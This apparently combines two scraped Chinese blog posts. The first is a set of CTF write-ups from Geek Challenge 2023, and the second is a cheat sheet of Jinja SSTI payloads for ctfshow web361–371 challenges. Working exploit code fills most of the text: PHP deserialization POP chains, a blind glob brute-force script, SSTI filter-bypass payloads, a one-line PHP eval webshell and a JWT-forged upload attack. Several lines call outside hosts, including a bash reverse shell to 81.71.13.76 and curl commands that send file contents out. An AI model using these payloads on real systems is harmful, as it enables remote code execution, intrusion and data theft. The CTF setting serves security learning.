echo ('&lt;br&gt;'); if(basename($_SERVER[$a])==='key.php'){ echo(&quot;找到了！但好像不能直接使用，怎么办，我好想她&lt;br&gt;&quot;); $file = &quot;key.php&quot;; readfile($file); } } else{ echo(&quot;你别这样，她会生气的┭┮﹏┭┮&quot;); } } } else{ echo(&quot;就这点能耐？怎么帮我找到她(╥╯^╰╥)&lt;br&gt;&quot;); } } } public function __get($good) { echo &quot;you are good,你快找到我爱的那个她了&lt;br&gt;&quot;; $zhui = $this-&gt;$good; $zhui[$good](); }}if (isset($_GET['user'])) { $user = $_GET['user']; if (!preg_match(&quot;/^[Oa]:[\\d]+/i&quot;, $user)) { unserialize($user); } else { echo(&quot;不是吧，第一层都绕不过去？？？&lt;br&gt;&quot;); }}else { echo(&quot;快帮我找找她！&lt;br&gt;&quot;);}?&gt; 虽然代码看起来比较长，但是还是比较好分析的，pop链也很容易看出来。需要用到两次pop链，第一条用来得到key.php的内容，第二次才是得到flag 123unserialize -&gt; useless(__destruct) -&gt; useless(readfile)unserialize -&gt; Me(__wakeup) -&gt;her(__invoke) -&gt;important(__sleep) -&gt;useless(__get) -&gt;her(find) /^[Oa]:[\\d]+/i第一次遇到这种情况，单独拿出来讲一下： 挺早之前我就知道使用C代替O能绕过wakeup，但那样的话只能执行construct()函数或者destruct()函数，无法添加任何内容，这次比赛学到了种新方法，就是把正常的反序列化进行一次打包，让最后生成的payload以C开头即可 12345678910111213141516171819202122&lt;?phperror_reporting(0);highlight_file(__FILE__);class ctfshow{ public function __wakeup(){ die(&quot;not allowed!&quot;); } public function __destruct(){ system($this-&gt;ctfshow); }}$data = $_GET['1+1&gt;2'];if(!preg_match(&quot;/^[Oa]:[\\d]+/i&quot;, $data)){ unserialize($data);}?&gt; 不能直接将字母O改成字母C,这里我们可以使用ArrayObject对正常的反序列化进行一次包装，让最后输出的payload以C开头 12345678910111213141516171819202122232425&lt;?phpclass ctfshow { public $ctfshow; public function __wakeup(){ die(&quot;not allowed!&quot;); } public function __destruct(){ echo &quot;OK&quot;; system($this-&gt;ctfshow); } }$a=new ctfshow;$a-&gt;ctfshow=&quot;whoami&quot;;$arr=array(&quot;evil&quot;=&gt;$a);$oa=new ArrayObject($arr);$res=serialize($oa);echo $res;//unserialize($res)?&gt;#C:11:&quot;ArrayObject&quot;:77:{x:i:0;a:1:{s:4:&quot;evil&quot;;O:7:&quot;ctfshow&quot;:1:{s:7:&quot;ctfshow&quot;;s:6:&quot;whoami&quot;;}};m:a:0:{}} 7.3.4才可以输出以C开头的payload，换7.4或者8.0输出的就是O开头了，除了这个函数还有其他方法可以对payload进行包装 实现了unserialize接口的大概率是C打头，经过所有测试发现可以用的类为： ArrayObject::unserialize ArrayIterator::unserialize RecursiveArrayIterator::unserialize SplObjectStorage::unserialize 参考 pop_onestr_shuffle：随机地打乱字符串中的所有字符 用原生类绕过md5,and的优先级要低于=，basename用ascii编码大于127绕过，$_SERVER是一个数组，可以自己打印看看 12345678910111213141516&lt;?phpclass useless{ public $QW; public $YXX;} $cmd=&quot;1&quot;;$a = new Exception($cmd);$b = new Exception($cmd,1);$tr = new useless();$tr-&gt;QW=$a;$tr-&gt;YXX=$b;$arr=array(&quot;evil&quot;=&gt;$tr);$oa=new ArrayObject($arr);echo urlencode(serialize(($oa)));#https://x64n15yejrv1auhzo7nkm4zct.node.game.sycsec.com/havefun.php/key.php/%ff?user=C%3A11%3A%22ArrayObject%22%3A473%3A%7Bx%3Ai%3A0%3Ba%3A1%3A%7Bs%3A4%3A%22evil%22%3BO%3A7%3A%22useless%22%3A2%3A%7Bs%3A2%3A%22QW%22%3BO%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A1%3A%221%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A8%3A%22E%3A%5Ca.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A9%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7Ds%3A3%3A%22YXX%22%3BO%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A1%3A%221%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A1%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A8%3A%22E%3A%5Ca.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A9%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7D%7D%7D%3Bm%3Aa%3A0%3A%7B%7D%7D&amp;a=PHP_SELF 最终得到一段加密的数据，太长了我就不贴了，将数据base64解密保存成图片,得到key和hername cyberchef pop_two12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;?phpclass Me { public $qwe; public $bro; public $secret;}class her{ public $hername; public $key; public $asd;}class important{ public $power;}class useless { public $seeyou ; public $QW; public $YXX;}$a = new Me();$a-&gt;bro = &amp;$a-&gt;secret;$b = new her();$a-&gt;qwe = $b;$c = new important();$d = new useless('deadbeef');// $d-&gt;good=array(&quot;seeyou&quot;=&gt;&quot;phpinfo&quot;) ;$cc = new her();$cc-&gt;key=9;$cc-&gt;hername=&quot;momo&quot;;$method = [$cc, 'find'];$d-&gt;seeyou= array(&quot;seeyou&quot;=&gt;$method) ;$c-&gt;power = $d;$b -&gt;asd = $c;$arr=array(&quot;evil&quot;=&gt;$a);$oa=new ArrayObject($arr);echo (serialize(($oa)));?&gt; #C:11:&quot;ArrayObject&quot;:345:{x:i:0;a:1:{s:4:&quot;evil&quot;;O:2:&quot;Me&quot;:3:{s:3:&quot;qwe&quot;;O:3:&quot;her&quot;:3:{s:7:&quot;hername&quot;;N;s:3:&quot;key&quot;;N;s:3:&quot;asd&quot;;O:9:&quot;important&quot;:1:{s:5:&quot;power&quot;;O:7:&quot;useless&quot;:4:{s:6:&quot;seeyou&quot;;a:1:{s:6:&quot;seeyou&quot;;a:2:{i:0;O:3:&quot;her&quot;:3:{s:7:&quot;hername&quot;;s:4:&quot;momo&quot;;s:3:&quot;key&quot;;i:9;s:3:&quot;asd&quot;;N;}i:1;s:4:&quot;find&quot;;}}s:2:&quot;QW&quot;;N;s:3:&quot;YXX&quot;;N;s:4:&quot;good&quot;;N;}}}s:3:&quot;bro&quot;;N;s:6:&quot;secret&quot;;R:20;}};m:a:0:{}} 这条pop链踩了坑，第一就是，对象里只写属性值，不要再写其他的不然会有影响； __sleep: 该函数必须返回一个需要进行序列化保存的成员属性数组 //并且只序列化该函数返回的这些成员属性 __get: 获得一个类中不可访问的成员变量时(未定义或私有属性) 在PHP中，你可以使用可调用的数组来将对象的方法赋值给变量。这可以通过将对象和方法名作为数组的元素来实现。以下是一个示例： 12345678910111213class MyClass { public function myMethod() { echo &quot;Hello, world!&quot;; }}$obj = new MyClass();$func = [$obj, 'myMethod'];// 现在 $func 变量包含了 MyClass 对象的 myMethod 方法// 调用该方法$func(); 这条链有意思，使得将her对象的find函数赋值给useless对象的seeyou变量，然后$this-&gt;good不用管，$this-&gt;good为空，会执行$good().$good是由important对象传过来的seeyou,而seeyou已经被赋值为了her对象的find函数，就会去执行find函数， 再用data协议绕过， 1file=data:text/plain;base64,bG92ZXlvdQ== 再用原生类绕过，这道题用了两次php原生类。 GlobIterator得到flag的文件名和路径.SplFileObject读文件，只能读取文件的第一行内容，配合php://filter拿到文件所有内容 1234567GET :fun=./f*POST: ctf=GlobIterator#flag_my_baby.phpGET:fun=php://filter/read=convert.base64-encode/resource=flag_my_baby.phpPOST :ctf=SplFileObject Akane!source code12345678910111213141516171819202122232425262728293031323334353637&lt;?phperror_reporting(0);show_source(__FILE__);class Hoshino{ public $Ruby; private $Aquamarine; public function __destruct() { $this-&gt;Ruby-&gt;func(); }}class Idol{ public $Akane; public function __wakeup() { $this-&gt;Akane = '/var/www/html/The************************.php'; } public function __call($method,$args) { $Kana = count(scandir($this-&gt;Akane)); if ($Kana &gt; 0) { die('Kurokawa Akane'); } else { die('Arima Kana'); } }}$a = unserialize(base64_decode($_GET['tuizi']));?&gt; 考的序列化，pop链也足够明显 :, 1Hoshino(__destruct) -&gt; Idol(__call) 但是没有找到任何可以命令执行的地方，然后我就去dirsearch ，也没有任何东西； 再仔细分析源码，pop链肯定是固定的这一点不用想，分析分析__call到底在干什么？ scandir列出 $this-&gt;Akane 目录中的文件和目录,返回的是一个数组 count 返回数组中元素的数目 glob:// — 查找匹配的文件路径模式 Example12345678&lt;?phperror_reporting(0);highlight_file(__FILE__);echo &quot;&lt;/br&gt;&quot;;echo count(scandir($_GET['file']));echo &quot;&lt;/br&gt;&quot;;var_dump(scandir($_GET['file']))?&gt; 12345http://127.0.0.1/test002.php?file=glob://f*#输出如下：2array(2) { [0]=&gt; string(4) &quot;flag&quot; [1]=&gt; string(8) &quot;flag.php&quot; } exp12345678910111213141516171819202122232425262728293031323334353637383940414243import requestsimport base64base_url =&quot;https://jn5lthd6e8wksjfi6mpuosppa.node.game.sycsec.com/?tuizi=&quot;str = &quot;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz&quot;def base64_encode(string): # 将字符串编码为 bytes 对象 string_bytes = string.encode('utf-8') # 使用 base64 模块进行编码 encoded_bytes = base64.b64encode(string_bytes) # 将编码后的 bytes 对象转换为字符串 encoded_string = encoded_bytes.decode('utf-8') return encoded_stringzifu = &quot;&quot;for i in range(100): k = i+30 data = f'O:7:&quot;Hoshino&quot;:2:{{s:4:&quot;Ruby&quot;;O:4:&quot;Idol&quot;:1:{{s:5:&quot;Akane&quot;;s:{k}:&quot;glob:///var/www/html/The*.php&quot;;}}s:19:&quot;HoshinoAquamarine&quot;;N;}}' zz = &quot;glob:///var/www/html/The&quot; +zifu +&quot;*.php&quot; if (len(zz) != k-1): break for j in range(len(str)): insert_string = zifu+str[j] print(zifu) start_index = data.find(&quot;The&quot;+zifu) insert_index = data.find(&quot;*.php&quot;) if insert_index != -1: # 在找到的位置之前插入字符串 modified_string = data[:insert_index] + insert_string + data[insert_index:] base_data = base64_encode(modified_string) url= base_url+base_data res = requests.get(url=url) if (len(res.text) ==4120): print(&quot;success&quot;) zifu=zifu +str[j] print(zifu) #print(url) break else: print(&quot;未找到插入位置&quot;)print(&quot;字符:&quot;+zifu)#字符:S4crEtF1AgFi1EByo2takuXX 访问TheS4crEtF1AgFi1EByo2takuXX.php得到flag klf_3source code再比赛中是看不到源码的，是我后来可以rce后，cat app.py得到源码的，为了方便写wp，就贴一下 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677import reimport osapp = Flask(__name__)@app.route('/', methods=['GET', 'POST'])def index(): return render_template('index.html')@app.route('/secr3ttt', methods=['GET', 'POST'])def secr3t(): name = request.args.get('klf', '') template = f''' &lt;html&gt; &lt;body&gt; &lt;h1&gt;找到secr3t了，但是找不到flag你还是个klf&lt;/h1&gt; &lt;h1&gt;%s&lt;/h1&gt; &lt;/body&gt; &lt;/html&gt; &lt;img src=\\&quot;https://image-obsidian-1317327960.cos.ap-chengdu.myqcloud.com/obisidian-blog/8.jpg\\&quot; alt=&quot;g&quot;&gt; &lt;!--klf?--&gt; &lt;!-- klf还想要flag？没那么容易 --&gt; ''' bl = ['_', '\\\\', '\\'', '&quot;', 'request', &quot;+&quot;, 'class', 'init', 'arg', 'config', 'app', 'self', 'cd', 'chr', 'request', 'url', 'builtins', 'globals', 'base', 'pop', 'import', 'popen', 'getitem', 'subclasses', '/', 'flashed', 'os', 'open', 'read', 'count', '*', '43', '45', '38', '124', '47', '59', '99', '100', 'cat', '~', ':', 'not', '0', 'length', 'index', '-', 'ord', '37', '94', '96', '48', '49', '50', '51', '52', '53', '54', '55', '56', '57', '58', '59', '[', ']', '@', '^', '#'] for i in bl: if i in name: return render_template('klf.html') #return &quot;真是klf！！！回去多学学啦&quot; pattern = r&quot;\\s*\\)\\s*\\)&quot; match = re.search(pattern, name) pattern2 = r&quot;\\s*\\)\\s*(,)?\\s*\\)&quot; match2 = re.search(pattern2, name) pattern3 = r&quot;\\s*\\)\\s*\\)\\s*\\|&quot; match3 = re.search(pattern3, name) pattern4 = r&quot;\\s*,\\s*\\)\\s*\\)\\s*\\|&quot; match4 = re.search(pattern4, name) pattern_mo = r&quot;\\d+\\s*%\\s*\\d+|[a-zA-Z]+\\s*%\\s*[a-zA-Z]+&quot; matche_mo = re.search(pattern_mo, name) if match: if match2.group(1): return render_template('klf.html') elif match4: return render_template('klf.html') elif match3: return render_template_string(template % name) else: return render_template('klf.html') # 输出匹配的结果 if matche_mo : return render_template('klf.html') a=render_template_string(template % name) if &quot;{&quot; in a: return a + render_template('win.html') return a@app.route('/robots.txt', methods=['GET'])def robots(): return send_from_directory(os.path.join(app.root_path, 'static'), 'robots.txt', mimetype='text/plain')if __name__ == '__main__': app.run(host='0.0.0.0', port=7888, debug=False) 还是可以用klf_2的解法解决,不可以用“))”，只需要从klf_2的exp改一下就好了，也是侥幸拿了一个一血 poc12345678910111213141516171819202122232425262728{% set po=dict(po=a,p=b)|join%} {% set a=(()|select|string|list)|attr(po)(24)%}{% set ini=(a,a,dict(in=a,it=b)|join,a,a)|join()%}{% set glo=(a,a,dict(glo=a,bals=b)|join,a,a)|join()%}{% set cls=(a,a,dict(cla=a,ss=b)|join,a,a)|join()%}{% set bs=(a,a,dict(bas=a,e=b)|join,a,a)|join()%}{% set geti=(a,a,dict(get=a)|join,dict(item=a)|join,a,a)|join()%}{% set subc=(a,a,dict(subcla=a,sses=b)|join,a,a)|join()%}{% set pp=dict(po=a,pen=b)|join %}{% set re=dict(re=a,ad=b)|join%}{% set kon=(()|select|string|list)|attr(po)(17)%} {% set dian=(g|string|list)|attr(po)(6)%} {% set qian=dict(p=a)|join%}{% set hou=dict(p=a,y=b)|join%}{% set ming=(kon,kon,dict(ap=a,p=b)|join,dian,hou)|join()%}{% set cmd=(dict(ca=a,t=b)|join,ming)|join()%}{% set a=()|attr(cls)|attr(bs)|attr(subc)()|attr(geti)(117)|attr(ini)|attr(glo)|attr(geti)(pp)(cmd)|attr(re)()%}{% set bb=(a|string|list)|attr(po)(246)%}{% set ho=(dict(ap=a,p=b))|join%}{% set fl=(dict(fl4gfl4g=a,fl4g=b))|join%}{% set cmd=(dict(ca=a,t=b)|join,kon,bb,ho,bb,fl)|join%}{% set res =()|attr(cls)|attr(bs)|attr(subc)()|attr(geti)(117)|attr(ini)|attr(glo)|attr(geti)(pp)(cmd)|attr(re)()%}{% print(res) %} famale_imp_l0ve只能上传zip文件，而且存在一处文件包含，限制了后缀必须为.jpg;这题的php环境是5.6；\\x00的截断在php&gt;5.3.4就没用了 123456789&lt;?php//o2takuXX师傅说有问题，忘看了。header('Content-Type: text/html; charset=utf-8');highlight_file(__FILE__);$file = $_GET['file'];if(isset($file) &amp;&amp; strtolower(substr($file, -4)) == &quot;.jpg&quot;){ include($file);}?&gt; 在php中 zip://test.zip#1.png是什么意思? 在PHP中，zip://test.zip#1.png是一种URL封装协议，它允许你像访问本地文件一样访问ZIP存档中的文件。在这个例子中，zip://表示使用ZIP协议，test.zip是ZIP存档的文件名，#1.png表示存档中的文件路径。因此，zip://test.zip#1.png意味着你正在引用test.zip存档中的1.png文件。 新建一个文件 1.jpg图片内容即可为需要执行的命令，如&lt;?php eval($_POST[1]); ?&gt;打包成zip即include.php?file=zip://upload/3.zip%231.jpg change_itsource code1234 &lt;!--用户名为：user密码也为：user--&gt; 登陆之后没有权限上传文件，查看cookie是一段jwt加密，没什么好说的直接用工具跑出key 12key : &quot;yibao&quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJRaW5nd2FuIiwibmFtZSI6ImFkbWluIiwiYWRtaW4iOiJ0cnVlIn0.qs6tjnaghMXiTsvqEMUauz_JGzxxKdtaXPGVtQUEHek 现在有权限上传任意文件了，但是只知道文件上传在upload下，不知道文件名，查看源代码 123456789101112function php_mt_seed($seed) { mt_srand($seed); } $seed = time(); php_mt_seed($seed); $characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'; $newFileName = ''; for ($i = 0; $i &lt; 10; $i++) { $newFileName .= $characters[mt_rand(0, strlen($characters) - 1)]; } 这代码很明显了，只要知道time的时间戳，既可以知道文件名， poc解释一下我的脚本:设置一个十秒的时间戳，在这十秒之内上传一个文件必定可以中一个文件的时间戳 123456789101112131415161718&lt;?php highlight_file(__FILE__);function php_mt_seed($seed){ mt_srand($seed);}for ($j = 0; $j &lt; 10; $j++){ $seed = time(); php_mt_seed($seed); sleep(1); echo $seed.&quot;: &quot;; $characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'; $newFileName = ''; for ($i = 0; $i &lt; 10; $i++) { $newFileName .= $characters[mt_rand(0, strlen($characters) - 1)]; } echo $newFileName.&quot;&lt;/br&gt;&quot;;} 运行这个脚本，在十秒之内上传一个木马文件即可，然后脚本会根据十个时间戳输出十个文件名，其中必定会中一个文件名 flag保卫战(待复现)ezrfi(待复现)scan_tool(待复现)ez_sql(待复现)EZ_Smuggling(待复现)java(待复现)","link":"/2023/11/26/Geek%20Challenge%202023/"},{"title":"SSTI漏洞","text":"ssti常用命令12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455__class__ 类的一个内置属性，表示实例对象的类。__base__ 类型对象的直接基类__bases__ 类型对象的全部基类（除object），以元组形式，类型的实例通常没有属性。 __bases____mro__ 此属性是由类组成的元组，在方法解析期间会基于它来查找基类。__subclasses__() 返回这个类的所有子类集合，Each class keeps a list of weak references to its immediate subclasses. This method returns a list of all those references still alive. The list is in definition order.__init__ 初始化类，返回的类型是function__globals__ 使用方式是 函数名.__globals__获取function所处空间下可使用的module、方法以及所有变量。__dic__ 类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的__dict__里__getattribute__() 实例、类、函数都具有的__getattribute__魔术方法。事实上，在实例化的对象进行.操作的时候（形如：a.xxx/a.xxx()），都会自动去调用__getattribute__方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。__getitem__() 调用字典中的键值，其实就是调用这个魔术方法，比如a['b']，就是a.__getitem__('b')__builtins__ 内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身。即里面有很多常用的函数。__builtins__与__builtin__的区别就不放了，百度都有。__import__ 动态加载类和函数，也就是导入模块，经常用于导入os模块，__import__('os').popen('ls').read()]__str__() 返回描写这个对象的字符串，可以理解成就是打印出来。url_for flask的一个方法，可以调用当前脚本中的函数，可以用于得到__builtins__，而且url_for.__globals__['__builtins__']含有current_app。get_flashed_messages flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__['__builtins__']含有current_app。lipsum flask的一个方法，可以用于得到__builtins__，而且lipsum.__globals__含有os模块：{{lipsum.__globals__.os.popen('ls').read()}}current_app 应用上下文，一个全局变量。request 可以用于获取字符串来绕过，包括下面这些，引用一下羽师傅的。此外，同样可以获取open函数:request.__init__.__globals__['__builtins__'].open('/proc\\self\\fd/3').read()request.args.x1 get传参request.values.x1 所有参数request.cookies cookies参数request.headers 请求头参数request.form.x1 post传参 (Content-Type:applicaation/x-www-form-urlencoded或multipart/form-data)request.data post传参 (Content-Type:a/b)request.json post传json (Content-Type: application/json)config 当前application的所有配置。此外，也可以这样{{ config.__class__.__init__.__globals__['os'].popen('ls').read() }}self.__dict__ 保存当前类实例或对象实例的属性变量键值对字典，{%print(&quot;DMIND&quot;)%} 控制语句中也能输出拼接字符：{% set ind=dict(ind=a,ex=a)|join%} 变量ind=index获取字符：{{lipsum|string|list|attr('pop')(18)}} 相当于：lipsum|string|list|attr('pop')(18) 输出：_（下划线）得到数字：{{lipsum|string|list|attr('index')('g')}} 相当于lipsum|string|list|attr('index')('g') 输出：10运算出其他数字：{% set shiba=ten%2bten-two %} %2b是URL编码后的加号得到数字：{{dict(a=a)|lower|list|count}}得到16运算出其他数字：{{dict(aa=a)|lower|list|count-dict(a=a)|lower|list|count}}得到1得到任意字符：{{dict(dmind=a)|slice(1)|first|first}}得到dmind获取__builtins__属性：{{lipsum.__globals__|attr('get')('__builtins__')}} 利用get()、pop()获取属性，相当于lipsum.__globals__.get('__builtins__')lipsum.__globals__.__builtins__ 相当于 lipsum|attr('__globals__')|attr('get')('__builtins__')lipsum.__globals__.__builtins__.chr(95) 相当于 lipsum|attr('__globals__')|attr('get')('__builtins__')|attr('get')('chr')(95)得到chr函数：{%set chr=lipsum.__globals__.__builtins__.chr%}利用chr()得到字符：{{chr(47)~chr(32)}} 47是/ 32是空格 ~是连接符利用os执行命令：lipsum.__globals__.os.popen('dir').read() 相当于 lipsum|attr('__globals__')|attr('get')('os')|attr('popen')('dir')|attr('read')()类似的 url_for['__globals__']['os']['popen']('dir').read()简单的读取文件：url_for[&quot;__globa&quot;+&quot;ls__&quot;].__builtins__.open(&quot;flag.txt&quot;).read()在能执行eval情况下：eval(__import__('so'[::-1]).__getattribute__('syste'%2b'm')('curl http://xxx:4567?p=`cat /f*`')) ssti常用过滤器123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960attr(): attr用于获取变量(过滤器与变量之间用管道符号（|）隔开，括号中可以有可选参数。可以链接多个过滤器。一个过滤器的输出应用于下一个过滤器) &quot;&quot;|attr(&quot;__class__&quot;) 相当于 &quot;&quot;.__class__ dict(po=ll,p=abc)|join ：连接键名，拼接得到popint()：将值转换为int类型；float()：将值转换为float类型；lower()：将字符串转换为小写；upper()：将字符串转换为大写；title()：把值中的每个单词的首字母都转成大写；capitalize()：把变量值的首字母转成大写，其余字母转小写；trim()：截取字符串前面和后面的空白字符；wordcount()：计算一个长字符串中单词的个数；reverse()：字符串反转；replace(value,old,new)： 替换将old替换为new的字符串；truncate(value,length=255,killwords=False)：截取length长度的字符串；striptags()：删除字符串中所有的HTML标签，如果出现多个空格，将替换成一个空格；escape()或e：转义字符，会将&lt;、&gt;等符号转义成HTML中的符号。显例：content|escape或content|e。safe()： 禁用HTML转义，如果开启了全局转义，那么safe过滤器会将变量关掉转义。示例： {{'&lt;em&gt;hello&lt;/em&gt;'|safe}}；list()：将变量列成列表；string()：将变量转换成字符串；join()：将一个序列中的参数值拼接成字符串。示例看上面payload；abs()：返回一个数值的绝对值；first()：返回一个序列的第一个元素；last()：返回一个序列的最后一个元素；format(value,arags,*kwargs)：格式化字符串。比如：{{ &quot;%s&quot; - &quot;%s&quot;|format('Hello?',&quot;Foo!&quot;) }}将输出：Helloo? - Foo!length()：返回一个序列或者字典的长度；sum()：返回列表内数值的和；sort()：返回排序后的列表；default(value,default_value,boolean=false)：如果当前变量没有值，则会使用参数中的值来代替。示例：name|default('xiaotuo')----如果name不存在，则会使用xiaotuo来替代。boolean=False默认是在只有这个变量为undefined的时候才会使用default中的值，如果想使用python的形式判断是否为false，则可以传递boolean=true。也可以使用or来替换。length()返回字符串的长度，别名是count ssti_fuzzweb361_(入门ssti)啥都没有过滤,所以可以用很多方法 1234567{{url_for.__globals__.os.popen('cat /flag').read()}}{{url_for.__globals__['__builtins__']['eval'](&quot;__import__('os').popen('cat /flag').read()&quot;)}}{{&quot;&quot;.__class__.__base__.__subclasses__()[132].__init__.__globals__['popen']('cat /flag').read()}}{{().__class__.__base__.__subclasses__()[].__init__.__globals__['__builtins__']['eval']('__import__(&quot;os&quot;).popen(&quot;cat /flag&quot;).read()')}} 123456789101112import requestsurl_base = &quot;http://26ecb42c-4859-430a-8b81-7476a70fba72.challenge.ctf.show?name=&quot;for i in range(500): url = url_base +&quot;{{''.__class__.__base__.__subclasses__()[&quot;+str(i)+&quot;]}}&quot; response = requests.get(url=url) if response.status_code == 200: if 'os._wrap_close' in response.text: print(i) break print(i) 1{{().__class__.__base__.__subclasses__()[].__init__.__globals__['__builtins__']['eval']('__import__(\\&quot;os\\&quot;).popen(&quot;bash -c \\'bash -i &gt;&amp; /dev/tcp/81.71.13.76/5050 0&gt;&amp;1\\'&quot;).read()')}} web362_(数字)可以用全角绕过过滤的数字，也可以使用不用数字的payload 1{{&quot;&quot;.__class__.__base__.__subclasses__()[１３２].__init__.__globals__['popen']('cat /flag').read()}} web363_(‘ “)利用requst.arg绕过 1{{().__class__.__mro__[-1].__subclasses__()[132].__init__.__globals__[request.args.popen](request.args.cmd).read()}}&amp;popen=popen&amp;cmd=cat /flag web364_(‘ “ args)利用request.cookie绕过 123{{().__class__.__mro__[-1].__subclasses__()[132].__init__.__globals__[request.cookies.popen](request.cookies.cmd).read()}}Cookie:popen=popen;cmd=cat /flag web365_([ ])增加过滤了**[ ]**,可以用__getitem()__绕过 123456789().__class__.__mro__.__getitem__(-1){{().__class__.__mro__.__getitem__(-1).__subclasses__().__getitem__(132).__init__.__globals__.__getitem__(request.cookies.popen)(request.cookies.cmd).read()}} Cookie:cmd=cat /flag;popen=popen============================================================={{url_for.__globals__.os.popen(request.cookies.cmd).read()}}Cookie:cmd=cat /flag web366_(下划线)利用attr过滤器绕过 1234{{lipsum.__globals__.os.popen('ls').read()}}{{(lipsum|attr(request.cookies.globals)).os.popen(reqeuest.cookies.cmd).read()}}Cookie:cmd=cat /flag;globals=__globals__ web367_(os)过滤了字符os，那就把os写到request里面就行了 12345x.__init__.__globals__['__builtins__'].eval(&quot;__import__('os').popen('ls /').read()&quot;){{(x|attr(request.cookies.init)|attr(request.cookies.globals)|attr(request.cookies.getitem))(request.cookies.builtins).eval(request.cookies.cmd)}}Cookie:init=__init__;globals=__globals__;getitem=__getitem__;builtins=__builtins__;cmd=__import__('os').popen('cat /flag').read() web368_(大括号)过滤了{{,}},可以用{% %} 使用request.values.x，values可以接受GET和POST形式的传参,注意get(request.values.b)中的get根据你的传参方式来的 1234{% print(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read() %}&amp;a=__globals__&amp;b=os&amp;c=cat /flag web369_(request)过滤了request,利用dict()|join拼接我们需要的字符 12345678910{% set po=dict(po=a,p=a)|join%} # dict()|join 拼接键名的方式，此处得到变量po=pop{% set a=(()|select|string|list)|attr(po)(24)%} #通过pop(24)选择到“_”下划线并赋值给a{% set ini=(a,a,dict(init=a)|join,a,a)|join()%} #ini=__init__{% set glo=(a,a,dict(globals=a)|join,a,a)|join()%} #glo=__globals__{% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%} #geti=__getitem__{% set built=(a,a,dict(builtins=a)|join,a,a)|join()%} #built=__builtins__{% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%} #x=q.__init__.__globals__.__getitem__('__builtins__'){% set chr=x.chr%} #chr=x.chr 选择到了chr函数，chr=&lt;built-in function chr&gt;{% set file=chr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)%} #结合ASCII和chr函数构造。file=/flag{%print(x.open(file).read())%} #利用open函数读取 web370_(0-9)将上一题的数字用全角替换 12345678910{% set po=dict(po=a,p=a)|join%} {% set a=(()|select|string|list)|attr(po)(２４)%} {% set ini=(a,a,dict(init=a)|join,a,a)|join()%} {% set glo=(a,a,dict(globals=a)|join,a,a)|join()%}{% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%}{% set built=(a,a,dict(builtins=a)|join,a,a)|join()%}{% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%}{% set chr=x.chr%} {% set file=chr(４７)%2bchr(１０２)%2bchr(１０８)%2bchr(９７)%2bchr(１０３)%}{%print(x.open(file).read())%} 也可以用count或者length 123456789101112131415{% set two=(dict(aa=a)|join|count)%}{% set three=(dict(aaa=a)|join|count)%}{% set four=(dict(aaaa=a)|join|count)%}{% set seven=(dict(aaaaaaa=a)|join|count)%}{% set eight=(dict(aaaaaaaa=a)|join|count)%}{% set nine=(dict(aaaaaaaaa=a)|join|count)%}{% set ten=(dict(aaaaaaaaaa=a)|join|count)%}{% set twofour=( two~four)|int%}{% set a=(()|select|string|list).pop(twofour)%}{% set globals=(a,a,dict(globals=s)|join,a,a)|join%}{% set init=(a,a,dict(init=v)|join,a,a)|join%}{% set builtins=(a,a,dict(builtins=c)|join,a,a)|join%}{% set a=(lipsum|attr(globals)).get(builtins)%}{% set chr=a.chr%}{% print a.open(chr((four~seven)|int)~chr((ten~two)|int)~chr((ten~eight)|int)~chr((nine~seven)|int)~chr((ten~three)|int)).read()%} web371_(print)过滤了print，将flag内容发送到vps 1234567891011s='__import__(&quot;os&quot;).popen(&quot;curl http://81.71.13.76:5555?p=`cat /flag`&quot;).read()'def fun(s): t='' for i in range(len(s)): if i&lt;len(s)-1: t+='chr('+(str(ord(s[i])))+')%2b' else: t+='chr('+(str(ord(s[i])))+')' return tprint(fun(s))#再将数字转成全角 1234567891011121314{% set po=dict(po=a,p=a)|join%} {% set a=(()|select|string|list)|attr(po)(２４)%} {% set ini=(a,a,dict(init=a)|join,a,a)|join()%} {% set glo=(a,a,dict(globals=a)|join,a,a)|join()%}{% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%}{% set built=(a,a,dict(builtins=a)|join,a,a)|join()%}{% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%}{% set chr=x.chr%}{% set 